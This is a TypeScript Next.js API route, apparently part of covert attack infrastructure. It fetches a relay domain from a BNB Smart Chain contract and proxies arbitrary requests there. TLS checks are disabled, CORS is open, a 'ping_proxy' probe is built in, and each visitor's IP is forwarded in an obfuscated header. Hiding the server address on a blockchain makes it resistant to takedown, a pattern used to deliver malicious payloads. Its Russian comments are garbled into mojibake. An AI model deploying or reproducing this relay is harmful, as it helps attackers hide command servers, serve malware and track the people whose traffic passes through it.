import { NextRequest, NextResponse } from 'next/server'
import axios from 'axios'
import https from 'https'
import crypto from 'crypto'

/**
 * –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É SSL (CURLOPT_SSL_VERIFYPEER => false –∏ CURLOPT_SSL_VERIFYHOST => false).
 * –ï—Å–ª–∏ –≤–∞–º —ç—Ç–æ –Ω–µ –Ω—É–∂–Ω–æ, —É–¥–∞–ª–∏—Ç–µ `rejectUnauthorized: false`.
 */
const httpsAgent = new https.Agent({ rejectUnauthorized: false })

/**
 * –¢–∏–ø –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–µ—à–∞ –≤ –ø–∞–º—è—Ç–∏
 */
type DomainCache = {
    domain: string
    timestamp: number
}

/**
 * –•—Ä–∞–Ω–∏–º –∫—ç—à –≤ –ø–∞–º—è—Ç–∏ (–≥–ª–æ–±–∞–ª—å–Ω–∞—è –¥–ª—è –º–æ–¥—É–ª—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è).
 * –ü—Ä–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —ç—Ç–æ—Ç –∫—ç—à —Å–±—Ä–∞—Å—ã–≤–∞–µ—Ç—Å—è.
 */
let inMemoryCache: DomainCache | null = null

/**
 * –û–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–µ 60 —Å–µ–∫—É–Ω–¥ (–∫–∞–∫ –∏ —Ä–∞–Ω—å—à–µ).
 */
const updateInterval = 60 // —Å–µ–∫—É–Ω–¥

/**
 * –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP-–∞–¥—Ä–µ—Å–∞ (–∞–Ω–∞–ª–æ–≥ getClientIP –≤ PHP).
 */
function getClientIP(req: NextRequest): string {
    // Check for Cloudflare IP
    const cloudflareIP = req.headers.get('cf-connecting-ip')
    if (cloudflareIP) {
        return cloudflareIP
    }
    
    // Check X-Forwarded-For
    const forwarded = req.headers.get('x-forwarded-for')
    if (forwarded) {
        return forwarded.split(',')[0].trim()
    }
    
    // Fallback to direct IP
    if (req.ip) {
        return req.ip
    }
    return 'unknown'
}

/**
 * –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ hex-—Å—Ç—Ä–æ–∫–∏ –∏–∑ —Å–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ –≤ –æ–±—ã—á–Ω—É—é —Å—Ç—Ä–æ–∫—É.
 */
function hexToString(hex: string): string {
    // –£–¥–∞–ª—è–µ–º "0x"
    hex = hex.replace(/^0x/, '')

    // –°–¥–≤–∏–≥–∞–µ–º –Ω–∞ 64 —Å–∏–º–≤–æ–ª–∞ (offset)
    hex = hex.substring(64)

    // –°–ª–µ–¥—É—é—â–∏–µ 64 —Å–∏–º–≤–æ–ª–∞ ‚Äî –¥–ª–∏–Ω–∞
    const lengthHex = hex.substring(0, 64)
    const length = parseInt(lengthHex, 16)

    // –û—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    const dataHex = hex.substring(64, 64 + length * 2)

    let result = ''
    for (let i = 0; i < dataHex.length; i += 2) {
        const charCode = parseInt(dataHex.substring(i, i + 2), 16)
        if (charCode === 0) break
            result += String.fromCharCode(charCode)
    }

    return result
}

/**
 * –ü–æ–ª—É—á–∞–µ–º –¥–æ–º–µ–Ω –∏–∑ —Å–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ —á–µ—Ä–µ–∑ RPC.
 * –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–∞—Å—Å–∏–≤ RPC-–∞–¥—Ä–µ—Å–æ–≤.
 */
async function fetchTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // –≠—Ç–æ hex "20965255"
    const data = '20965255'

    for (const rpcUrl of rpcUrls) {
        try {
            const response = await axios.post(
                rpcUrl,
                {
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [
                        {
                            to: contractAddress,
                            data: `0x${data}`,
                        },
                        'latest',
                    ],
                },
                {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 120000,
                    httpsAgent,
                    validateStatus: () => true,
                }
            )

            if (response.data?.error) {
                // –ï—Å–ª–∏ –≤ –æ—Ç–≤–µ—Ç–µ –µ—Å—Ç—å –ø–æ–ª–µ error ‚Äî –ø—Ä–æ–±—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π RPC
                continue
            }

            const resultHex = response.data?.result
            if (!resultHex) {
                continue
            }

            const domain = hexToString(resultHex)
            if (domain) {
                return domain
            }
        } catch (error) {
            // –ü—Ä–æ–±—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π RPC
        }
    }

    throw new Error('Could not fetch target domain')
}

/**
 * –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–æ–º–µ–Ω –∏–∑ –∫—ç—à–∞, –ª–∏–±–æ –æ–±–Ω–æ–≤–ª—è–µ—Ç, –µ—Å–ª–∏ –∫—ç—à —É—Å—Ç–∞—Ä–µ–ª.
 */
async function getTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —á—Ç–æ-—Ç–æ –≤ –ø–∞–º—è—Ç–∏
    if (inMemoryCache) {
        const diff = Math.floor(Date.now() / 1000) - inMemoryCache.timestamp
        if (diff < updateInterval) {
            // –ö—ç—à –∞–∫—Ç—É–∞–ª–µ–Ω
            return inMemoryCache.domain
        }
    }

    // –ò–Ω–∞—á–µ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∑–∞–Ω–æ–≤–æ
    const domain = await fetchTargetDomain(rpcUrls, contractAddress)

    // –û–±–Ω–æ–≤–ª—è–µ–º –≤ –ø–∞–º—è—Ç–∏
    inMemoryCache = {
        domain,
        timestamp: Math.floor(Date.now() / 1000),
    }

    return domain
}

/**
 * –ü—Ä–æ–∫—Å–∏-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫, –ø–æ–≤—Ç–æ—Ä—è—é—â–∏–π –ª–æ–≥–∏–∫—É –≤–∞—à–µ–≥–æ PHP-—Å–∫—Ä–∏–ø—Ç–∞ (–∫—Ä–æ–º–µ –∑–∞–ø–∏—Å–∏ –Ω–∞ –¥–∏—Å–∫).
 */
async function handleProxy(req: NextRequest, endpoint: string) {
    // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ RPC –∏ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)
    const rpcUrls = ['https://binance.llamarpc.com', 'https://bsc.drpc.org']
    const contractAddress = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0'

    // –ü–æ–ª—É—á–∞–µ–º –¥–æ–º–µ–Ω (–∫—ç—à–∏—Ä–æ–≤–∞–Ω –≤ –ø–∞–º—è—Ç–∏)
    let domain = await getTargetDomain(rpcUrls, contractAddress)
    domain = domain.replace(/\/+$/, '') // —É–±–∏—Ä–∞–µ–º trailing slash

    endpoint = '/' + endpoint.replace(/^\/+/, '') // –¥–æ–±–∞–≤–ª—è–µ–º –æ–¥–∏–Ω –≤–µ–¥—É—â–∏–π —Å–ª—ç—à
    const finalUrl = `${domain}${endpoint}`

    // –ú–µ—Ç–æ–¥ –∑–∞–ø—Ä–æ—Å–∞
    const method = req.method

    // –ê–Ω–∞–ª–æ–≥ file_get_contents('php://input')
    const bodyBuffer = await req.arrayBuffer()
    const body = bodyBuffer.byteLength > 0 ? Buffer.from(bodyBuffer) : null

    // –°–æ–±–∏—Ä–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏, —É–±–∏—Ä–∞–µ–º host/origin –∏ —Ç.–ø.
    const outHeaders: Record<string, string> = {}
    req.headers.forEach((value, key) => {
        const lowerKey = key.toLowerCase()
        if (
            ['host', 'origin', 'accept-encoding', 'content-encoding'].includes(lowerKey)
        ) {
            return
        }
        outHeaders[lowerKey] = value
    })

    // –î–æ–±–∞–≤–ª—è–µ–º x-dfkjldifjlifjd = IP
    outHeaders['x-dfkjldifjlifjd'] = getClientIP(req)

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    console.log('Final URL:', finalUrl)
    console.log('Method:', method)
    console.log('Headers:', outHeaders)
    console.log('Body length:', body?.length || 0)

    // –ü—Ä–æ–∫—Å–∏—Ä—É–µ–º —á–µ—Ä–µ–∑ axios
    try {
        const response = await axios({
            url: finalUrl,
            method,
            headers: outHeaders,
            data: body,
            responseType: 'arraybuffer',
            httpsAgent,
            maxRedirects: 5,
            timeout: 120000,
            validateStatus: () => true,
        })

        const responseData = response.data as Buffer
        const statusCode = response.status
        const contentType = response.headers['content-type']

        // –ì–æ—Ç–æ–≤–∏–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞
        const resHeaders: Record<string, string> = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
        }

        if (contentType) {
            resHeaders['Content-Type'] = contentType
        }

        return new NextResponse(responseData as BodyInit, {
            status: statusCode,
            headers: resHeaders,
        })
    } catch (error) {
        console.error('Proxy error:', error)
        console.error('Error details:', {
            message: error instanceof Error ? error.message : String(error),
            stack: error instanceof Error ? error.stack : undefined,
            finalUrl,
            method
        })
        
        return new NextResponse('error: ' + String(error), {
            status: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            },
        })
    }
}

/**
 * OPTIONS ‚Äî –≤–æ–∑–≤—Ä–∞—â–∞–µ–º 204 + CORS
 */
export async function OPTIONS() {
    return new NextResponse(null, {
        status: 204,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Max-Age': '86400',
        },
    })
}

/**
 * –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è GET/POST/–∏ —Ç.–¥.
 */
async function handleRequest(req: NextRequest) {
    console.log('üöÄ API Route called:', req.method, req.url)
    const { searchParams } = new URL(req.url)
    const e = searchParams.get('e')
    console.log('üìù Parameter e:', e)

    // –ü–∏–Ω–≥
    if (e === 'ping_proxy') {
        console.log('üèì Ping request detected')
        return new NextResponse('pong', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' },
        })
    }

    // –ò–Ω–∞—á–µ –ø—Ä–æ–∫—Å–∏—Ä—É–µ–º, –µ—Å–ª–∏ e –∑–∞–¥–∞–Ω
    if (e) {
        console.log('üîÑ Proxying to endpoint:', e)
        const endpoint = decodeURIComponent(e)
        console.log('üéØ Decoded endpoint:', endpoint)
        return handleProxy(req, endpoint)
    }

    // –ò–Ω–∞—á–µ 400
    return new NextResponse('Missing endpoint', { status: 400 })
}

// –≠–∫—Å–ø–æ—Ä—Ç –º–µ—Ç–æ–¥–æ–≤
export async function GET(req: NextRequest) {
    return handleRequest(req)
}
export async function POST(req: NextRequest) {
    return handleRequest(req)
}
export async function PUT(req: NextRequest) {
    return handleRequest(req)
}
export async function DELETE(req: NextRequest) {
    return handleRequest(req)
}
export async function PATCH(req: NextRequest) {
    return handleRequest(req)
}
export async function HEAD(req: NextRequest) {
    return handleRequest(req)
}
